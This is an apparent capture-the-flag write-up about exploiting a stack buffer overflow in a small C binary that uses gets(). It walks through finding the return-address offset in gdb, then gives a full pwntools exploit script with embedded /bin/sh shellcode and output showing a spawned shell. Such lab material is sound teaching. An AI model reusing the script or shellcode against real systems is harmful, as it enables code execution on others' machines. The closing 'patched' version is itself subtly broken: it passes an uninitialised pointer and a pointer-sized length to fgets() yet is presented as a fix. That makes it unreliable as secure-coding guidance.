Let's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	printf("%p\n", &buf0);
	gets(buf0);
}

int main()
{
	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
	nothing();
}
```

So we can see that it suffers from the same buffer overflow vulnerabillity as the rest. However unlike the previous levels, there isn't anywhere in here that will print out "Level Cleared!". So we will have to somehow pop a shell and read the "out file". What we can do, is we can push our own shellcode (shellcode is precompiled assembly code that you can push onto a program of the same architecture, and it should be able to run) onto the stack than overwrite the eip register to execute the shellocde. So essentially we will be writing code to the program, than executing that code. We can see that the elf prints out the address of the buffer, so that is one less thing we have to worry about. The first thing we will need is to find out how many characters we will have to write to reach the eip register.

```
gdb-peda$ disas nothing
Dump of assembler code for function nothing:
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	sub    esp,0xd8
   0x08048454 <+9>:	sub    esp,0x8
   0x08048457 <+12>:	lea    eax,[ebp-0xd0]
   0x0804845d <+18>:	push   eax
   0x0804845e <+19>:	push   0x8048540
   0x08048463 <+24>:	call   0x8048300 <printf@plt>
   0x08048468 <+29>:	add    esp,0x10
   0x0804846b <+32>:	sub    esp,0xc
   0x0804846e <+35>:	lea    eax,[ebp-0xd0]
   0x08048474 <+41>:	push   eax
   0x08048475 <+42>:	call   0x8048310 <gets@plt>
   0x0804847a <+47>:	add    esp,0x10
   0x0804847d <+50>:	nop
   0x0804847e <+51>:	leave  
   0x0804847f <+52>:	ret    
End of assembler dump.
gdb-peda$ b *nothing+47
Breakpoint 1 at 0x804847a
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b4/b4 
Even if you do hack this elf, what are you going to do?. You should really get back to research.
0xffffcf68
0000
```

One wall of text later...

```
Breakpoint 1, 0x0804847a in nothing ()
gdb-peda$ x/x $ebp-0xd0
0xffffcf68:	0x30303030
gdb-peda$ info frame
Stack level 0, frame at 0xffffd040:
 eip = 0x804847a in nothing; saved eip = 0x80484a6
 called by frame at 0xffffd060
 Arglist at 0xffffd038, args: 
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebp at 0xffffd038, eip at 0xffffd03c
```

So we have the addess of the buffer (0xffffcf68) and the eip register (0xffffd03c). Now to find the distance we need to reach it.

```
>>> 0xffffd03c - 0xffffcf68
212
```

So we will have 212 bytes untill we reach the eip register. So we have the offset, and the address that we want to write to. The last thing we will need is the shellcode. For shellcode you can either write it yourself, or look it up online. I typically get my shellcode from this website.

http://shell-storm.org/shellcode/

and a link to the exact shell code I'm using for this exploit

http://shell-storm.org/shellcode/files/shellcode-597.php

Now keep in mind, when you are picking/writing your shellcode you have to have the same binary architecture. We are currently dealing with a 32 bit linux elf, so if you are picking shellcode from that website it should be under the Linux/x86 category.

Now that we have our shellcode, the address of the buffer, and the offset we can write our exploit. We will have to adjust the filler we use to reach the eip register to allow room for the shellcode. The shellcode I am using is 34 bytes long, so my filler will be 212-34 = 178 characters long. However this time I will actually write a python script instead of just a one liner. The reason for this is the address of the buffer will change under certain circumstances, so it is better to read it every time you run the exploit instead of just hardcoding it in. For this exploit I used pwntools, because it is a really big help and takes care of a lot of the hassle for me. Here is my exploit.

```
#Import the pwntools library.
from pwn import *

#The process is like an actualy command you run, so you will have to adjust the path if your exploit isn't in the same directory as the challenge.
target = process("./b4")

#Just receive the first line, which for our purposes isn't important.
target.recvline()

#Store the address of the buffer in a variable, and strip away the newline to prevent conversion issues
address = target.recvline().strip("\n")

#Convert the string to a hexidecimal
address = int(address, 16)

#Pack the hexidecimal in little endian for 32 bit systems
address = p32(address)

#Store the shellcode in a variable
shellcode = "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"

#Make the filler to reach the eip register
filler = "0"*178

#Craft the payload
payload = shellcode + filler + address

#Send the payload
target.sendline(payload)

#Drop into interactive mode so you can use the shell
target.interactive()
```

Now let's try out the exploit...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b4$ python exploit.py 
[+] Starting local process './b4': Done
[*] Switching to interactive mode
$ echo Is this working?
Is this working?
$ ls
b4  b4.c  exploit.py  out
$ cat out
I see, you brough your own topics to research. Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b4' stopped with exit code 0
[*] Got EOF while sending in interactive
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b4$ 
```

And just like that, we pwned the binary. Now let's fix it.

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	printf("%p\n", &buf0);
	fgets(*buf0, sizeof(*buf0), stdin);
}

int main()
{
	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
	nothing();
}
```

Let's test it...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b4$ python -c 'print "0"*400' | ./b4_secure 
Even if you do hack this elf, what are you going to do?. You should really get back to research.
0xffffcf78
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b4$ 
```

Just like that, we patched the binary.
